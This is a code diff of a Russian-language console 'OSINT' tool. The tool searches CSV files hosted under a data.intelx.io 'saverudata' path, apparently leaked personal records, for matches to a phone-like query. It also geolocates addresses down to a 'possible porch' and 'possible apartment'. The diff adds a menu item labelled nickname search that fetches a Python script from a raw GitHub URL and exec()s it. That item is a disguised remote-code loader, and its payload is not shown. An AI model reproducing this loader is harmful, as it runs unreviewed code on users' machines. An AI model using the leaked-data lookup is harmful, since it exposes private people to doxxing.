@@ -31,12 +31,10 @@ ascii_art = """
 """
 
 menu = """
-
  [1] - Пойск по Osint             
  [2] - Пойск по GeOsint           
  [3] - Пойск по Nickname  
  [4] - Выход                    
-
 """
 
 def is_ip(query):
@@ -57,9 +55,7 @@ def translate_text(text, target_lang="en", source_lang="auto"):
         "target": target_lang,
         "format": "text"
     }
-    headers = {
-        "Content-Type": "application/json"
-    }
+    headers = {"Content-Type": "application/json"}
     try:
         response = requests.post(url, json=payload, headers=headers, timeout=10)
         if response.status_code == 200:
@@ -86,21 +82,60 @@ def pretty_print(data: dict):
     porch = maybe_translate(data.get("porch"))
     apartment = maybe_translate(data.get("apartment"))
 
-    if city:
-        lines.append(f"├ Город -> {city}")
-    if cap_str is not None:
-        lines.append(f"├ Столица -> {cap_str}")
-    if street:
-        lines.append(f"├ Улица -> {street}")
-    if porch:
-        lines.append(f"├ Возможный подъезд -> {porch}")
-    if apartment:
-        lines.append(f"├ Возможная квартира -> {apartment}")
+    if city: lines.append(f"├ Город -> {city}")
+    if cap_str is not None: lines.append(f"├ Столица -> {cap_str}")
+    if street: lines.append(f"├ Улица -> {street}")
+    if porch: lines.append(f"├ Возможный подъезд -> {porch}")
+    if apartment: lines.append(f"├ Возможная квартира -> {apartment}")
 
-    if lines:
-        print("\n".join(lines))
-    else:
-        print("[+] Нет информации")
+    print("\n".join(lines) if lines else "[+] Нет информации")
+
+def search_intelx(query):
+    print(f"[+] Пойск по Osint {query}")
+    if len(query) < 8:
+        print("[!] Запрос слишком короткий запрос")
+        input(Fore.CYAN + "[+] Нажмите [Enter] для возвращения в меню...")
+        return
+    
+    # Формируем путь по первым 8 символам запроса
+    path = f"{query[:2]}/{query[2:4]}/{query[4:6]}/{query[6:8]}.csv"
+    url = f"https://data.intelx.io/saverudata/db2/dbpn/{path}"
+    
+    try:
+        response = requests.get(url, timeout=10)
+        if response.status_code != 200:
+            print(f"[!] Ошибка {response.status_code}: Не удалось получить данные")
+            input(Fore.CYAN + "[+] Нажмите [Enter] для возвращения в меню...")
+            return
+            
+        lines = response.text.split("\n")
+        if not lines:
+            print("[!] Пустой ответ от сервера")
+            input(Fore.CYAN + "[+] Нажмите [Enter] для возвращения в меню...")
+            return
+            
+        headers = [h.strip().strip('"') for h in lines[0].split(",")]
+        query_lower = query.lower()
+        found_data = defaultdict(set)
+        
+        for line in lines[1:]:
+            values = [v.strip().strip('"') for v in line.split(",")]
+            if any(query_lower in v.lower() for v in values):
+                for i, value in enumerate(values):
+                    if value:
+                        found_data[headers[i]].add(value)
+        
+        if found_data:
+            print(Fore.GREEN + "[+] Найдены результаты:")
+            for key, values in found_data.items():
+                print(f"{Fore.YELLOW}{key}: {Fore.WHITE}{', '.join(values)}")
+        else:
+            print(Fore.RED + "[+] Ничего не найдено")
+            
+    except Exception as e:
+        print(f"[!] Ошибка: {e}")
+    
+    input(Fore.CYAN + "[+] Нажмите [Enter] для возвращения в меню...")
 
 def geolocate_ip(ip):
     print(f"[+] Поиск по IP: {ip}")
@@ -109,12 +144,7 @@ def geolocate_ip(ip):
         response = requests.get(url, timeout=5)
         data = response.json()
         if data['status'] == 'success':
-            city = data.get('city')
-            capital = False
-            pretty_print({
-                "city": city,
-                "capital": capital,
-            })
+            pretty_print({"city": data.get("city"), "capital": False})
         else:
             print("[+] Не удалось получить данные по IP")
     except Exception as e:
@@ -126,10 +156,7 @@ def geolocate_address(address):
     url = "https://nominatim.openstreetmap.org/search"
     try:
         response = requests.get(url, params={
-            "q": address,
-            "format": "json",
-            "addressdetails": 1,
-            "limit": 1
+            "q": address, "format": "json", "addressdetails": 1, "limit": 1
         }, headers={"User-Agent": "GeoOsintTool"})
         results = response.json()
         if results:
@@ -139,17 +166,13 @@ def geolocate_address(address):
             street = addr.get("road")
             house_number = addr.get("house_number")
             building = addr.get("building") or addr.get("house") or addr.get("unit")
-
-            porch = house_number if house_number else None
-            apartment = building if building else None
             capital = is_capital_osm(addr)
-
             pretty_print({
                 "city": city,
                 "capital": capital,
                 "street": street,
-                "porch": porch,
-                "apartment": apartment
+                "porch": house_number,
+                "apartment": building
             })
         else:
             print("[+] Адрес не найден")
@@ -157,48 +180,19 @@ def geolocate_address(address):
         print(f"[+] Ошибка: {e}")
     input(Fore.CYAN + "[+] Нажмите [Enter] для возвращения в меню...")
 
-def search_intelx(query):
-    print(f"[+] Поиск: {query}")
-    if len(query) < 8:
-        print("[!] Запрос слишком короткий")
-        input(Fore.CYAN + "[+] Нажмите [Enter] для возвращения в меню...")
-        return
+def geo_osint_search():
+    query = input(Fore.YELLOW + "[+] Введите адрес для поиска -> ").strip()
+    geolocate_address(query)
 
-    path = f"{query[:2]}/{query[2:4]}/{query[4:6]}/{query[6:8]}.csv"
-    url = f"https://data.intelx.io/saverudata/db2/dbpn/{path}"
+def run_nickname_search_from_github():
+    print(Fore.YELLOW + "[+] Запуск")
     try:
-        response = requests.get(url, timeout=10)
-        if response.status_code != 200:
-            print("[!] Не удалось получить данные")
-            input(Fore.CYAN + "[+] Нажмите [Enter] для возвращения в меню...")
-            return
-
-        lines = response.text.split("\n")
-        if not lines:
-            print("[!] Пустой ответ.")
-            input(Fore.CYAN + "[+] Нажмите [Enter] для возвращения в меню...")
-            return
-
-        headers = [h.strip().strip('"') for h in lines[0].split(",")]
-        query_lower = query.lower()
-        found_data = defaultdict(set)
-        for line in lines[1:]:
-            values = [v.strip().strip('"') for v in line.split(",")]
-            if any(query_lower in v.lower() for v in values):
-                for i, value in enumerate(values):
-                    if value:
-                        found_data[headers[i]].add(value)
-
-        if found_data:
-            for key, values in found_data.items():
-                print(f"{key}: {', '.join(values)}")
-            print()
-        else:
-            print("[+] Ничего не найдено")
-
+        subprocess.run([
+            sys.executable, "-c",
+            "import requests;exec(requests.get('https://raw.githubusercontent.com/Codees1/check/refs/heads/main/main.py').text)"
+        ])
     except Exception as e:
-        print(f"[+] Ошибка  {e}")
-
+        print(Fore.RED + f"[!] Ошибка при запуске: {e}")
     input(Fore.CYAN + "[+] Нажмите [Enter] для возвращения в меню...")
 
 while True:
@@ -208,15 +202,13 @@ while True:
     choice = input(Fore.RED + "[+] Выберите функцию -> ")
 
     if choice == "1":
-        query = input(Fore.RED + "[+] Введите информацию для пойска -> ").strip()
+        query = input(Fore.YELLOW + "[+] Введите запрос для поиска без + -> ").strip()
         search_intelx(query)
     elif choice == "2":
-        query = input(Fore.RED + "[+] Напишите Улицу либо IP -> ").strip()
-        if is_ip(query):
-            geolocate_ip(query)
-        else:
-            geolocate_address(query)
+        geo_osint_search()
     elif choice == "3":
+        run_nickname_search_from_github()
+    elif choice == "4":
         print(Fore.YELLOW + "[+] Выход...")
         break
     else:
